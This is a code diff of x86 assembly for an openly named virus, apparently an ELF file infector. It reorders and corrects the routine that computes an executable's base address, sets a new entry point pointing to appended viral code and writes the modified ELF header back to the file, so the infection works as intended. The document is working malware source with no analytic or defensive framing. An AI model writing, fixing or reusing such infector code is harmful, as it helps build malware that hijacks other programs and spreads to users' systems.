@@ -86,6 +86,7 @@ global _start
 section .text
 virus_start:
 nop
+
 get_anchor_loc:
     call anchor
 anchor:
@@ -198,25 +199,6 @@ _start:
     mov eax, dword [%$elf_header+EHDR_phoff]
     mov dword [%$phoff], eax
 
-    .read_base_address:
-    lseek [%$fd], [%$phoff], SEEK_SET
-    lea_stack_var [%$p_stack_var], [%$ph]
-    read [%$fd], [%$p_stack_var], PHDR_SIZE
-    mov eax, [%$ph+PHDR_vaddr]
-    mov [%$exe_code_start_vaddr], eax
-
-    .set_new_entry_point:
-    mov eax, 0
-    add eax, dword [%$exe_code_start_vaddr]
-    add eax, dword [%$fsz]
-    add eax, dword CODE_START_OFFSET
-    mov dword [%$elf_header+ENTRY], eax
-
-    .write_elf_header_back_to_file:
-    seek_to_start [%$fd]
-    lea_stack_var [%$p_stack_var], [%$elf_header]
-    write [%$fd], [%$p_stack_var], ELF_HEADER_SIZE
-
     .calc_last_ph_offset:
     mov eax, [%$phnum]
     dec eax
@@ -243,6 +225,23 @@ _start:
     lseek [%$fd], [%$last_ph_offset], SEEK_SET
     lea_stack_var [%$p_stack_var], [%$ph]
     write [%$fd], [%$p_stack_var], PHDR_SIZE
+
+    .read_base_address:
+    mov eax, dword [%$ph+PHDR_vaddr]
+    sub eax, dword [%$ph+PHDR_offset]
+    mov dword [%$exe_code_start_vaddr], eax
+
+    .set_new_entry_point:
+    mov eax, 0
+    add eax, dword [%$exe_code_start_vaddr]
+    add eax, dword [%$fsz]
+    add eax, dword CODE_START_OFFSET
+    mov dword [%$elf_header+ENTRY], eax
+
+    .write_elf_header_back_to_file:
+    seek_to_start [%$fd]
+    lea_stack_var [%$p_stack_var], [%$elf_header]
+    write [%$fd], [%$p_stack_var], ELF_HEADER_SIZE
 
     .close_file:
     close [%$fd]
